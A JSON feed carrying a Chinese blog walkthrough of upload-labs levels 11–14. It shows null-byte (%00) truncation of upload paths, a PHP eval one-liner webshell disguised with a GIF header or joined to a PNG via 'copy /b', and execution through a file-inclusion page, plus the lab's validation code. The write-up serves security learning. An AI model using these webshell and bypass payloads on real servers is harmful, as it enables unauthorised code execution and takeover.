{
    "version": "https://jsonfeed.org/version/1",
    "title": "My Violet Eva Garden • All posts by \"文件上传漏洞探究\" category",
    "description": "",
    "home_page_url": "https://kiyomijin.github.io",
    "items": [
        {
            "id": "https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/",
            "url": "https://kiyomijin.github.io/2022/10/04/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E7%89%B9%E6%AE%8A%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89/",
            "title": "特殊的文件上传漏洞（一）",
            "date_published": "2022-10-03T16:52:26.000Z",
            "content_html": "<h1 id=\"特殊的文件上传漏洞一\"><a class=\"markdownIt-Anchor\" href=\"#特殊的文件上传漏洞一\">#</a> 特殊的文件上传漏洞（一）</h1>\n<p>我们来讲讲特殊的文件上传漏洞（一）。</p>\n<h2 id=\"get-00截断绕过\"><a class=\"markdownIt-Anchor\" href=\"#get-00截断绕过\">#</a> GET-00 截断绕过</h2>\n<p>Pass-11</p>\n<p>抓包，看到在请求的 url 上出现了敏感的字符，save_path=…/upload/</p>\n<p><img src=\"image-20221003220951062.png\" alt=\"image-20221003220951062\"></p>\n<p>出现这样的字样，我们首先需要想想，这个上传保存路径是否可控？</p>\n<p>首先为了上传成功首先得把 backdoor.php 改成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.jpg&quot;</span><br></pre></td></tr></table></figure>\n<p>接下来我们猜想，save_path 可以指定某个路径存储，我们可以让它存在别的地方嘛？</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">save_path=../ </span><br></pre></td></tr></table></figure>\n<p>上传成功</p>\n<p><img src=\"image-20221003221405064.png\" alt=\"image-20221003221405064\"></p>\n<p>确实生成了</p>\n<p><img src=\"C:%5CUsers%5CJcH4liXh%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221003221432601.png\" alt=\"image-20221003221432601\"></p>\n<p>那也就是说，控制 save_path 是可行的，但想到如果 save_path 变成一个文件路径的话，应该会报错。果不其然</p>\n<p><img src=\"image-20221003221709058.png\" alt=\"image-20221003221709058\"></p>\n<p>如果 <code>能有这么一种方法</code> ，能让 save_path<strong> 直接成为最后保存的文件路径该多好</strong>，比如 <code>save_path=../upload/11.php</code></p>\n<p>虽然上传的是 backdoor.jpg，但存储的时候直接就成了 php 格式。有办法做到么？有！答案就是 GET-00 截断、</p>\n<p>只需要修改：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">save_path=../upload/<span class=\"number\">11</span>.php%<span class=\"number\">00</span></span><br></pre></td></tr></table></figure>\n<p>成功上传不报错</p>\n<p><img src=\"image-20221003221909843.png\" alt=\"image-20221003221909843\"></p>\n<p>upload/11.php 也生成了</p>\n<p><img src=\"image-20221003221948845.png\" alt=\"image-20221003221948845\"></p>\n<p>菜刀正常连接。搞定！</p>\n<p>除了在 url 里加 %00 之外，有些时候，也可以在 filename 里加</p>\n<p>比如这样改</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.jpg+&quot;</span></span><br></pre></td></tr></table></figure>\n<p>然后在 hex 里找到 + 的位置（十六进制为 2b），将其替换成 00</p>\n<p><img src=\"image-20221003222306181.png\" alt=\"image-20221003222306181\"></p>\n<p>其实用到的原理就是： <code>00截断</code> 就是借 php 解析字符串的时候 <code>遇到00截断停止，不再解析</code> 的特点，把文件路径提前 <code>错误地识别成了文件</code> （<strong>本应该是路径才对</strong>）。</p>\n<p>这就衍生出了，post-00 截断</p>\n<h2 id=\"post-00截断绕过\"><a class=\"markdownIt-Anchor\" href=\"#post-00截断绕过\">#</a> POST-00 截断绕过</h2>\n<p>Pass-12</p>\n<p>save_path 出现在了 POST 请求的参数区</p>\n<p><img src=\"image-20221003224305275.png\" alt=\"image-20221003224305275\"></p>\n<p>那么我们可以这样构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">../upload/123.php+</span><br><span class=\"line\">filename=&quot;backdoor.png&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003224407296.png\" alt=\"image-20221003224407296\"></p>\n<p>然后在 hex 中修改 + 的十六进制 0x2b 为 00</p>\n<p><img src=\"image-20221003224514879.png\" alt=\"image-20221003224514879\"></p>\n<p>上传成功</p>\n<p><img src=\"image-20221003224555355.png\" alt=\"image-20221003224555355\"></p>\n<p>菜刀也可以成功连接 123.php 文件</p>\n<p><img src=\"image-20221003224620743.png\" alt=\"image-20221003224620743\"></p>\n<h2 id=\"图片马绕过白名单绕过\"><a class=\"markdownIt-Anchor\" href=\"#图片马绕过白名单绕过\">#</a> 图片马绕过 (白名单绕过)</h2>\n<p>Pass-13</p>\n<p><img src=\"image-20221003230438023.png\" alt=\"image-20221003230438023\"></p>\n<p>本题考察对于文件头解析 + 图片马合成</p>\n<h3 id=\"绕过文件头解析\"><a class=\"markdownIt-Anchor\" href=\"#绕过文件头解析\">#</a> 绕过文件头解析</h3>\n<p>常用文件头：</p>\n<ul>\n<li><code>.jpeg</code> ;  <code>.jpe</code> ;  <code>.jpg</code> ,  <code>&quot;JPGGraphic File&quot;</code></li>\n<li><code>.gif</code> , <code> &quot;GIF 89A&quot;</code></li>\n<li><code>.zip</code> ,  <code>&quot;Zip Compressed&quot;</code></li>\n<li><code>.doc</code> ;  <code>.xls</code> ;  <code>.xlt</code> ;  <code>.ppt</code> ;  <code>.apr</code> ,  <code>&quot;MS Compound Document v1 or Lotus Approach APRfile&quot;</code></li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">JPEG（jpg），文件头：FFD8FF</span><br><span class=\"line\"></span><br><span class=\"line\">PNG（png），文件头：89504E47</span><br><span class=\"line\"></span><br><span class=\"line\">GIF（gif），文件头：47494638</span><br><span class=\"line\"></span><br><span class=\"line\">Windows Bitmap（bmp），文件头：424D</span><br><span class=\"line\"></span><br><span class=\"line\">CAD（dwg），文件头：41433130</span><br><span class=\"line\"></span><br><span class=\"line\">Adobe Photoshop（psd），文件头：38425053</span><br><span class=\"line\"></span><br><span class=\"line\">Rich Text Format（rtf），文件头：7B5C727466</span><br><span class=\"line\"></span><br><span class=\"line\">XML（xml），文件头：3C3F786D6C</span><br><span class=\"line\"></span><br><span class=\"line\">HTML（html），文件头：68746D6C3E</span><br><span class=\"line\"></span><br><span class=\"line\">Email [thorough only]（eml），文件头：44656C6976572792D646174653A</span><br><span class=\"line\"></span><br><span class=\"line\">Outlook Express（dbx），文件头：CFAD12FEC5FD746F</span><br><span class=\"line\"></span><br><span class=\"line\">Outlook（pst），文件头：2142444E</span><br><span class=\"line\"></span><br><span class=\"line\">Ms Word/Excel（xls.or.doc），文件头：D0CF11E0</span><br><span class=\"line\"></span><br><span class=\"line\">Ms Access（mdb），文件头：5374616E64617264204A</span><br><span class=\"line\"></span><br><span class=\"line\">WordPerfect（wpd），文件头：FF575043</span><br><span class=\"line\"></span><br><span class=\"line\">Adobe Acrobat（pdf），文件头：255044462D312E</span><br><span class=\"line\"></span><br><span class=\"line\">Quicken（qdf），文件头：AC9EBD8F</span><br><span class=\"line\"></span><br><span class=\"line\">Windows Password（pwl），文件头：E3828596</span><br><span class=\"line\"></span><br><span class=\"line\">ZIP Archive（zip），文件头：504B0304</span><br><span class=\"line\"></span><br><span class=\"line\">RAR Archive（rar），文件头：52617221</span><br><span class=\"line\"></span><br><span class=\"line\">Wave（wav），文件头：57415645</span><br><span class=\"line\"></span><br><span class=\"line\">AVI（avi），文件头：41564920</span><br><span class=\"line\"></span><br><span class=\"line\">Real Audio（ram），文件头：2E7261FD</span><br><span class=\"line\"></span><br><span class=\"line\">Real Media（rm），文件头：2E524D46</span><br><span class=\"line\"></span><br><span class=\"line\">MPEG（mpg），文件头：000001BA</span><br><span class=\"line\"></span><br><span class=\"line\">MPEG（mpg），文件头：000001B3</span><br><span class=\"line\"></span><br><span class=\"line\">QuickTime（mov），文件头：6D6F6F76</span><br><span class=\"line\"></span><br><span class=\"line\">Windows Media（asf），文件头：3026B2758E66CF11</span><br><span class=\"line\"></span><br><span class=\"line\">MIDI（mid），文件头：4D546864</span><br></pre></td></tr></table></figure>\n<p>有些 web 程序会根据传上来文件的头几个字节来判断是属于什么类型，比如 GIF 的魔术字是 <code>GIF 89A</code></p>\n<p>我们尝试在一句话木马前面增加 <code>GIF 89A</code> ：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GIF 89A</span><br><span class=\"line\">&lt;?php @eval($_POST[margin]);?&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003232704271.png\" alt=\"image-20221003232704271\"></p>\n<p>可以看到成功被识别成了 gif 而上传给了服务器</p>\n<p>我们将此路径 <code>./upload/5020221003232644.gif</code>  拷贝，<strong>注意只拷贝一个点</strong></p>\n<p>发现题目还给了一个文件包含的链接</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$file</span>))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"variable\">$file</span>;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(__file__);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>当前 <code>http://www.upload_lab.com/include.php</code>  页面，可以接收一个 <code>GET型参数</code> <strong> file</strong>，我们如下构造：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//www.upload_lab.com/include.php?file=./upload/5020221003232644.gif</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003233246265.png\" alt=\"image-20221003233246265\"></p>\n<p>可以发现，只显示了 GIF 89A，一句话木马没有显示在页面，说明成功解析成了 php。</p>\n<p>菜刀连接，成功：</p>\n<p><img src=\"image-20221003233349810.png\" alt=\"image-20221003233349810\"></p>\n<h3 id=\"绕过unpack头两字节\"><a class=\"markdownIt-Anchor\" href=\"#绕过unpack头两字节\">#</a> 绕过 unpack 头两字节</h3>\n<p>使用 windows 的 copy 命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy /?</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003233804358.png\" alt=\"image-20221003233804358\"></p>\n<p>我们准备两个文件，一个是正常的 png 图片 <code>webshell.png</code> ，一个是一句话木马的 php 文件 <code>backdoor.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">copy webshell.png /b + backdoor.php /b backdoor.png</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003234531986.png\" alt=\"image-20221003234531986\"></p>\n<p>那么可以上传这个文件，可以看到成功上传</p>\n<p><img src=\"image-20221003234801987.png\" alt=\"image-20221003234801987\"></p>\n<p><img src=\"image-20221003234900575.png\" alt=\"image-20221003234900575\"></p>\n<p>菜刀成功连接：</p>\n<p><img src=\"image-20221003234932717.png\" alt=\"image-20221003234932717\"></p>\n<p>回过头来看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getReailFileType</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"title function_ invoke__\">fopen</span>(<span class=\"variable\">$filename</span>, <span class=\"string\">&quot;rb&quot;</span>); <span class=\"comment\">//只读方式打开，读取字节</span></span><br><span class=\"line\">    <span class=\"variable\">$bin</span> = <span class=\"title function_ invoke__\">fread</span>(<span class=\"variable\">$file</span>, <span class=\"number\">2</span>); <span class=\"comment\">//只读2字节</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">fclose</span>(<span class=\"variable\">$file</span>);<span class=\"comment\">//关闭文件</span></span><br><span class=\"line\">    <span class=\"variable\">$strInfo</span> = @<span class=\"title function_ invoke__\">unpack</span>(<span class=\"string\">&quot;C2chars&quot;</span>, <span class=\"variable\">$bin</span>);<span class=\"comment\">//将$bin解包，C：有序的字符 2:2个 chars：变成chars array</span></span><br><span class=\"line\">    <span class=\"variable\">$typeCode</span> = <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars1&#x27;</span>].<span class=\"variable\">$strInfo</span>[<span class=\"string\">&#x27;chars2&#x27;</span>]); <span class=\"comment\">//chars1=“xxx&quot;,  chars2=&quot;xxxx&quot;,将这两个字符串拼接后变成整数付给$typeCode</span></span><br><span class=\"line\">    <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;&#x27;</span>; </span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(<span class=\"variable\">$typeCode</span>)&#123;      </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">255216</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;jpg&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">13780</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;png&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">7173</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;gif&#x27;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:            </span><br><span class=\"line\">            <span class=\"variable\">$fileType</span> = <span class=\"string\">&#x27;unknown&#x27;</span>;</span><br><span class=\"line\">        &#125;    </span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$fileType</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_type</span> = <span class=\"title function_ invoke__\">getReailFileType</span>(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$file_type</span> == <span class=\"string\">&#x27;unknown&#x27;</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_type</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，isset 函数通过下面的会很好理解：</p>\n<ul>\n<li>就是一个变量已声明，且不为 NULL（可以是’ '）时，会返回真。</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 结果为 TRUE，所以后边的文本将被打印出来。</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$var</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;This var is set so I will print.&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 在后边的例子中，我们将使用 var_dump 输出 isset() 的返回值。</span></span><br><span class=\"line\"><span class=\"comment\">// the return value of isset().</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"string\">&quot;anothertest&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>));      <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>, <span class=\"variable\">$b</span>)); <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">unset</span> (<span class=\"variable\">$a</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>));     <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>, <span class=\"variable\">$b</span>)); <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$foo</span> = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$foo</span>));   <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">array</span> (<span class=\"string\">&#x27;test&#x27;</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">&#x27;hello&#x27;</span> =&gt; <span class=\"literal\">NULL</span>, <span class=\"string\">&#x27;pie&#x27;</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;a&#x27;</span> =&gt; <span class=\"string\">&#x27;apple&#x27;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;test&#x27;</span>]));            <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;foo&#x27;</span>]));             <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;hello&#x27;</span>]));           <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 键 &#x27;hello&#x27; 的值等于 NULL，所以被认为是未置值的。</span></span><br><span class=\"line\"><span class=\"comment\">// 如果想检测 NULL 键值，可以试试下边的方法。 </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">array_key_exists</span>(<span class=\"string\">&#x27;hello&#x27;</span>, <span class=\"variable\">$a</span>)); <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Checking deeper array values</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;pie&#x27;</span>][<span class=\"string\">&#x27;a&#x27;</span>]));        <span class=\"comment\">// TRUE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;pie&#x27;</span>][<span class=\"string\">&#x27;b&#x27;</span>]));        <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$a</span>[<span class=\"string\">&#x27;cake&#x27;</span>][<span class=\"string\">&#x27;a&#x27;</span>][<span class=\"string\">&#x27;b&#x27;</span>]));  <span class=\"comment\">// FALSE</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"绕过getimagesize\"><a class=\"markdownIt-Anchor\" href=\"#绕过getimagesize\">#</a> 绕过 getimagesize</h3>\n<p>Pass-14 和 Pass-13 绕过方式一样，同样 <code>上传图片copy拼接马</code> 即可。</p>\n<p>我们直接来看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$types</span> = <span class=\"string\">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_exists</span>(<span class=\"variable\">$filename</span>))&#123;<span class=\"comment\">//传进来的非空</span></span><br><span class=\"line\">        <span class=\"variable\">$info</span> = <span class=\"title function_ invoke__\">getimagesize</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = <span class=\"title function_ invoke__\">image_type_to_extension</span>(<span class=\"variable\">$info</span>[<span class=\"number\">2</span>]);<span class=\"comment\">//我们只需要提取图像信息中的【索引2】，也就是类型信息</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stripos</span>(<span class=\"variable\">$types</span>,<span class=\"variable\">$ext</span>)&gt;=<span class=\"number\">0</span>)&#123;<span class=\"comment\">//从$types(类型集合)里面寻找$ext(当前上传图像类型)第一次出现的位置</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$ext</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">isImage</span>(<span class=\"variable\">$temp_file</span>);<span class=\"comment\">//调用isImage函数，参数为上传到服务器的临时文件名。返回值为上传文件类型，或者false</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"variable\">$res</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"variable\">$res</span>;<span class=\"comment\">//如果$res不为false，那就是拼接上传路径+/+随机数+时间戳+后缀</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;<span class=\"comment\">//将临时文件移动给新的永久路径上</span></span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，getimagesize () 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$remote_png_url</span> = <span class=\"string\">&#x27;http://www.runoob.com/wp-content/themes/w3cschool.cc/assets/img/logo-domain-green2.png&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$img_data</span> = <span class=\"title function_ invoke__\">getimagesize</span>(<span class=\"variable\">$remote_png_url</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$img_data</span> );</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">输出为：</span><br><span class=\"line\"><span class=\"title function_ invoke__\">Array</span></span><br><span class=\"line\">(</span><br><span class=\"line\">    [<span class=\"number\">0</span>] =&gt; <span class=\"number\">290</span></span><br><span class=\"line\">    [<span class=\"number\">1</span>] =&gt; <span class=\"number\">69</span></span><br><span class=\"line\">    [<span class=\"number\">2</span>] =&gt; <span class=\"number\">3</span></span><br><span class=\"line\">    [<span class=\"number\">3</span>] =&gt; width=<span class=\"string\">&quot;290&quot;</span> height=<span class=\"string\">&quot;69&quot;</span></span><br><span class=\"line\">    [bits] =&gt; <span class=\"number\">8</span></span><br><span class=\"line\">    [mime] =&gt; image/png</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p><strong>返回结果说明</strong></p>\n<ul>\n<li>索引 0 给出的是图像 <code>宽度</code> 的像素值</li>\n<li>索引 1 给出的是图像 <code>高度</code> 的像素值</li>\n<li>索引 2 给出的是图像的 <code>类型</code> ，返回的是数字，其中 1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF (intel byte order)，8 = TIFF (motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li>\n<li>索引 3 给出的是一个 <code>宽度和高度的字符串</code> ，可以直接用于 HTML 的 <image> 标签</li>\n<li>索引 bits 给出的是图像的 <code>每种颜色的位数</code> ，二进制格式</li>\n<li>索引 channels 给出的是图像的 <code>通道值</code> ，RGB 图像 <code>默认是 3</code></li>\n<li>索引 mime 给出的是图像的 <code> MIME 信息</code> ，此信息可以用来在 HTTP  <code>Content-type </code> 头信息中发送正确的信息，如： header (“Content-type: image/jpeg”);</li>\n</ul>\n<p>stripos () 